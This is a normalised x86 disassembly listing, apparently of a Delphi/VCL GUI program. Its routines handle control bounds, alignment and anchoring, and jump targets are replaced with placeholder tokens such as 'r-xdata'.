push sub_439321
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_437388
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_437358
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_437358
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404378
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403fc0
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_437278
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_439328
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403430
sub_439354
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439374
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439394
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4393b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4393d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4393f4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439414
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419630
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4369ac
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403430
sub_43944c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413ec8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_443ca4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_443ddc
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437358
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_443b3c
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_443efc
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4394ef
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4394f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_439534
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_4394f8
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_4395e4
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033c0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_439618
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_439638
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403430
test al al
je r-xdata
mov eax edi
call sub_439678
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_4396a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_4396d0
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406850
mov eax esp
call sub_41245c
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_436e9c
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403430
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403430
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_436ec8
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_41245c
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_4123e4
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_436e70
sub_4397f8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_439838
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43609c
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43986c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_436458
push ebx
push sub_43b2fc
call sub_41a284
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c85c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41ca04
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403540
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454d38
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403fc0
lea eax [ ebx + 0x188 ]
call sub_403f6c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43996b
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_43996b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_439990
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov eax edi
call sub_419480
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4055a8
mov eax [ edi + 0x178 ]
call sub_403234
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_435004
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_43a630
mov eax edi
call sub_43a870
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403234
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_43a834
mov esi eax
mov edx esi
mov eax edi
call sub_43a69c
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_43a870
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_436530
test bl bl
jle r-xdata
call sub_41a31c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_439a60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4139e0
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43dd00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413840
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413934
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413840
test eax eax
je r-xdata
sub_439b34
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436794
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439b7b
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
sub_439b7b
mov eax [ ebp - 0x4 ]
call sub_439a60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b234
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43850c
sub_439bb0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_439bcb ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_439c3c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43de44
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_4123e4
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fc4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_439ed2 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_439fc4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_439ff3 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43a07c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a870
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4136e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413840
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_439c3c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43a834
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_4138bc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413840
mov edx eax
mov ecx ebx
mov eax edi
call sub_439bb0
